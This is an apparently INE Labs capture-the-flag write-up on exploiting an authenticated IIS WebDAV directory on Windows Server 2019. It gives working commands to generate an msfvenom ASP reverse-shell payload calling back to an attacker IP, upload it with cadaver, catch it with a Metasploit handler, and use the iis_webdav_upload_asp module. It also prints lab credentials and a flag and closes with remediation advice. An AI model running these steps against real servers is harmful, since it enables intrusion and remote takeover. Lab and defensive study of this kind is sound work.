---
title: "Windows: IIS Server WebDAV (Metasploit)"
description: "Exploiting an authenticated IIS WebDAV service two ways: manually uploading an msfvenom ASP shell with cadaver and catching it with a handler, and with the iis_webdav_upload_asp module, to land a Meterpreter session and read the flag."
date: 2025-11-03
platform: "INE Labs"
difficulty: "Medium"
tags: ["IIS", "WebDAV", "cadaver", "msfvenom", "ASP", "Metasploit", "Windows"]
cover: "./photo6.png"
---

# Windows: IIS Server WebDAV (Metasploit)

**Classification:** Host & Network Penetration Testing / System & Host-Based Attacks<br>
**Target:** demo.ine.local (10.2.19.184) — AD-IIS, Windows Server 2019 (Build 17763)<br>
**Attacker:** 10.10.37.8 (Kali)<br>
**Credentials:** `bob:password_123321`<br>
**Flag:** `d3aff16a801b4b7d36b4da1094bee345`

## 1. Executive Summary

The IIS server exposes an authenticated **WebDAV** directory that allows file uploads. We
exploit it two ways: (1) manually — generate an ASP Meterpreter shell with `msfvenom`,
upload it with `cadaver`, and trigger it against a handler; and (2) with the
`iis_webdav_upload_asp` module, which uploads, executes and then deletes the ASP payload
automatically. Both yield a Meterpreter session; the flag is in `C:\flag.txt`.

## 2. Recon

```bash
ping -c 4 demo.ine.local      # 10.2.19.184
```

![Ping target](./photo1.png)

An unauthenticated `http-enum` / WebDAV access returns 401 — authorization required.

![http-enum — unauthorized](./photo2.png)

![WebDAV directory requires auth](./photo3.png)

The lab-provided credentials let us in.

![Authenticated access to WebDAV](./photo4.png)

## 3. Method 1 — Manual ASP Shell (cadaver)

Generating an ASP Meterpreter payload.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.37.8 LPORT=1234 -f asp > shell.asp
```

![msfvenom — shell.asp](./photo5.png)

Connecting to WebDAV with `cadaver` and uploading it.

```bash
cadaver http://demo.ine.local/webdav
# Username: bob / Password: password_123321
ls
put shell.asp
```

![cadaver — WebDAV listing](./photo6.png)

![Uploading shell.asp (1)](./photo7.png)

![Uploading shell.asp (2)](./photo8.png)

Starting a matching handler.

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.37.8
set LPORT 1234
run
```

![multi/handler listening](./photo9.png)

Browsing to the uploaded `shell.asp` executes it.

![Triggering the webshell](./photo10.png)

A Meterpreter session opens on **AD-IIS**.

```
sysinfo    # AD-IIS — Windows Server 2019
```

![Meterpreter session opened](./photo11.png)

## 4. Method 2 — iis_webdav_upload_asp Module

```bash
use exploit/windows/iis/iis_webdav_upload_asp
set HttpUsername bob
set HttpPassword password_123321
set RHOSTS 10.2.19.184
set PATH /webdav/metasploit.asp
```

![Module configured](./photo12.png)

```bash
exploit
```

![Exploit — session opened](./photo13.png)

Notably, the module **deletes the uploaded ASP file** afterwards, cleaning up the artifact.

![Module removes the uploaded ASP file](./photo14.png)

## 5. Capturing the Flag

```bash
cd C:\
dir
cat flag.txt
# d3aff16a801b4b7d36b4da1094bee345
```

![Flag from C:\flag.txt](./photo15.png)

## 6. Remediation Recommendations

1. **Disable WebDAV** on IIS, or make it read-only and block script execution in upload
   directories (remove Execute/Script permissions).
2. **Separate upload and executable paths** so uploaded content can never be run as ASP.
3. **Enforce strong credentials** and least privilege for the IIS/WebDAV accounts.
4. **Monitor** for `PUT` of executable extensions and unexpected ASP execution.
